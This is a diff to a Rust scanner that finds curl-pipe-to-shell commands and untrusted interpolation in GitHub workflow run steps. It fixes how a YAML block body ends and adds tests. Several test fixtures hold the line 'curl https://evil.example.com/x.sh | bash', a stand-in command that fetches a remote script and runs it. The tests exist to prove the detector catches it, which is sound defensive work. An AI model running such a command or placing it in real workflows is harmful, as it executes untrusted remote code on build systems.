@@ -467,28 +467,6 @@ fn line_has_curl_pipe_shell(line: &str) -> bool {
     )
 }
 
-/// The sibling YAML keys of a workflow *step* that can appear next to `run:`.
-/// When a `run: |` block scalar is written on the `- ` list-marker line, the
-/// `run:` key sits at the dash indent, so a sibling block (`env:`, `with:`, …)
-/// of the *same step* is indented *deeper* than the dash — a pure indent test
-/// would wrongly keep scanning it as `run:` body. Treating any of these keys
-/// as a hard block terminator closes that gap (a step's shell body never
-/// contains a bare `env:` / `uses:` line at the start of a physical line).
-const STEP_SIBLING_KEYS: &[&str] = &["env:", "with:", "name:", "if:", "id:", "uses:", "run:"];
-
-/// Whether `trimmed` (an already-`trim`-ed line) begins a sibling step key —
-/// `env:`, `with:`, `name:`, `if:`, `id:`, `uses:`, or another `run:`. Matches
-/// either the bare key on its own line (`env:`) or the key followed by a
-/// value (`env: production`); the trailing `:` is part of the match so an
-/// ordinary `run:`-body command (`ifconfig`, `idle …`) is never mistaken for
-/// a key. The list-item form (`- env:`) is also accepted.
-fn is_step_sibling_key(trimmed: &str) -> bool {
-    let key = trimmed.strip_prefix("- ").unwrap_or(trimmed);
-    STEP_SIBLING_KEYS
-        .iter()
-        .any(|k| key == *k || key.starts_with(k))
-}
-
 /// Scan a workflow's `run:` steps for a pipe-to-shell and for untrusted-input
 /// interpolation. A `run:` block in YAML can be a single line or a `|`/`>`
 /// block scalar; this scans every physical line and only counts a line as a
@@ -509,11 +487,18 @@ fn check_workflow_run_steps(input: &str, findings: &mut Vec<Finding>) {
         let indent = raw_line.len() - raw_line.trim_start().len();
         let trimmed = raw_line.trim();
 
-        // Detect the start of a `run:` step.
+        // Detect the start of a `run:` step. A `run:`-prefixed line indented
+        // *inside* an active block body is body content (e.g. a shell command
+        // invoking a binary named `run`), not a new step — treat it as a step
+        // start only when not currently in a block, or when it sits at/above
+        // the current block's run-key column. Without this guard such a body
+        // line would terminate the block scan early and a later `curl`-into-a-
+        // shell body line would go undetected.
         let run_inline = trimmed
             .strip_prefix("- run:")
             .or_else(|| trimmed.strip_prefix("run:"))
-            .or_else(|| trimmed.strip_prefix("-run:"));
+            .or_else(|| trimmed.strip_prefix("-run:"))
+            .filter(|_| !in_run_block || indent <= run_key_col);
 
         if let Some(inline) = run_inline {
             let inline = inline.trim();
@@ -553,13 +538,12 @@ fn check_workflow_run_steps(input: &str, findings: &mut Vec<Finding>) {
 
         if in_run_block {
             // The block ends at the first non-blank line indented at or below
-            // the `run` *key* column, or at the first sibling step key
-            // (`env:` / `with:` / `name:` / `if:` / `id:` / `uses:` of the
-            // same step — these are always shallower than or equal to the key
-            // column when the step is written `- run: |`, but a defensive key
-            // match closes the case regardless of exact indentation). A blank
-            // line stays inside the block.
-            if !trimmed.is_empty() && (indent <= run_key_col || is_step_sibling_key(trimmed)) {
+            // the `run` *key* column — the YAML block-scalar rule (the body is
+            // every line indented strictly deeper than the key). A sibling step
+            // key (`env:` / `with:` / `name:` / `if:` / `id:` / `uses:`) of the
+            // same step sits *at* the key column, so this catches it too; a
+            // blank line stays inside the block.
+            if !trimmed.is_empty() && indent <= run_key_col {
                 in_run_block = false;
             } else if !trimmed.is_empty() {
                 scan_run_line(trimmed, &mut curl_pipe_evidence, &mut untrusted_evidence);
@@ -1424,6 +1408,21 @@ mod tests {
         // `run: | # comment` is a valid block scalar — a trailing YAML comment
         // on the indicator line must not let the body evade the curl|bash scan.
         let wf = "jobs:\n  build:\n    steps:\n      - run: | # deploy step\n          echo start\n          \
+                  curl https://evil.example.com/x.sh | bash\n";
+        assert!(has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::WorkflowCurlPipeShell
+        ));
+    }
+
+    #[test]
+    fn workflow_run_body_line_starting_with_run_does_not_end_block() {
+        // A block-body line that itself starts with `run:` (a shell command,
+        // e.g. one invoking a binary named `run`) must NOT be mistaken for a
+        // new step or a block terminator — the scan must keep going and still
+        // catch a later pipe-to-shell in the same body.
+        let wf = "jobs:\n  build:\n    steps:\n      - run: |\n          run: deploy\n          \
                   curl https://evil.example.com/x.sh | bash\n";
         assert!(has(
             wf,
